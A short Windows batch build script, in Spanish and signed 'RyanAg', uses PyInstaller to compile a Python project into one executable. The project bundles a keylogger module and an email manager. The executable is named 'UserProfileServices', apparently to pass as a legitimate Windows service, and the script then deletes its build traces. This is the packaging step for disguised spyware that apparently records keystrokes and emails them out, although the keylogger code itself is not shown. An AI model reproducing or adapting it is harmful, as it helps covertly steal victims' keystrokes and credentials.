@echo off

:: Variables
set nameScript=UserProfileServices
set currentDirectory=%~dp0

:: Compilar
echo Compilando Recursos...
pyinstaller --noconfirm --onefile --icon "%currentDirectory%icon.ico" --name "%nameScript%" --add-data "%currentDirectory%config.json;." --add-data "%currentDirectory%email_manager.py;." --add-data "%currentDirectory%json_manager.py;." --add-data "%currentDirectory%keylogger_manager.py;." "%currentDirectory%main.py"

:: Salida
echo Limpiando Residuos...
rmdir /s /q build
powershell mv '%currentDirectory%dist' '%currentDirectory%output'
del %nameScript%.spec
echo Fin del Compilado

::  \____/\
::  /\``/\
:: -byRyanAg...